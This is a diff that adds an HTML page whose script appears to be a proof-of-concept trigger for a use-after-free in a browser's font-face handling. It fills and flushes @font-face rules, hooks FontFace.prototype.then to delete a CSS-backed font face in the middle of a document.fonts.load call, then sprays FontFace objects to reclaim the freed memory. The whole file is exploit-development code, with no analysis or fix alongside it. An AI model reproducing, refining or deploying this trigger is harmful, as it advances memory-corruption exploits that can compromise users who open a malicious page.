@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<style id="s">
+@font-face { font-family: prepad; src: url(nonexistent-prepad.woff); unicode-range: U+E123; }
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<script>
+"use strict";
+
+let spray = [];
+let keep = [];
+
+const PAD = 0x22;
+const FLUSH = 0x240;
+const SPRAY_COUNT = FLUSH + PAD + 0x300;
+
+function forceStyle() {
+    void document.body.offsetTop;
+}
+
+function addPads() {
+    const sheet = document.getElementById("s").sheet;
+    for (let i = 0; i < PAD; i++) {
+        sheet.insertRule(`@font-face {
+            font-family: pad${i};
+            src: url(nonexistent-pad-${i}.woff);
+            unicode-range: U+E000;
+        }`, sheet.cssRules.length);
+    }
+    forceStyle();
+}
+
+function addFlushRules() {
+    const st = document.createElement("style");
+    st.id = "flush";
+    document.head.appendChild(st);
+
+    const sheet = st.sheet;
+    for (let i = 0; i < FLUSH; i++) {
+        sheet.insertRule(`@font-face {
+            font-family: flush${i};
+            src: url(nonexistent-flush-${i}.woff);
+            unicode-range: U+E000;
+        }`, sheet.cssRules.length);
+    }
+    forceStyle();
+}
+
+function deleteFlushRules() {
+    const sheet = document.getElementById("flush").sheet;
+    while (sheet.cssRules.length)
+        sheet.deleteRule(0);
+    forceStyle();
+}
+
+function killFontFaceSetCache() {
+    // CSSFontFaceSet::add() clears m_cache for every family.
+    const f = new FontFace("cachekill" + keep.length, "local(Helvetica)", {
+        unicodeRange: "U+E124"
+    });
+    document.fonts.add(f);
+    keep.push(f);
+}
+
+function cssFontFaceSpray() {
+    for (let i = 0; i < SPRAY_COUNT; i++) {
+        const f = new FontFace("reclaim" + i, "local(Helvetica)", {
+            unicodeRange: "U+0041"
+        });
+        spray.push(f);
+    }
+}
+
+window.onload = () => {
+    // Important: trigger is not family x. The CSSSegmentedFontFace for trigger
+    // must not contain the CSS-backed x target.
+    const trigger = new FontFace("trigger", "local(Helvetica)", {
+        unicodeRange: "U+0041"
+    });
+    document.fonts.add(trigger);
+    void trigger.loaded;
+
+    addPads();
+    addFlushRules();
+
+    let fired = false;
+    Object.defineProperty(FontFace.prototype, "then", {
+        configurable: true,
+        get() {
+            if (!fired && this === trigger) {
+                fired = true;
+                const sheet = document.getElementById("s").sheet;
+
+                // Drop CSSFontFaceSet::m_cache, including the segmented face for x,
+                // before removing x from the backing set.
+                killFontFaceSetCache();
+
+                // Delete CSS-backed x. If the separated-trigger hypothesis is right,
+                // x can destruct before this getter returns.
+                sheet.deleteRule(1);
+                forceStyle();
+
+                deleteFlushRules();
+                cssFontFaceSpray();
+            }
+            return undefined;
+        }
+    });
+
+    // U+0041 selects trigger, U+0042 selects CSS-backed x.
+    document.fonts.load("1em trigger, x", "AB").then(
+        faces => keep.push(faces),
+        err => keep.push(err)
+    );
+};
+</script>
+</body>
+</html>
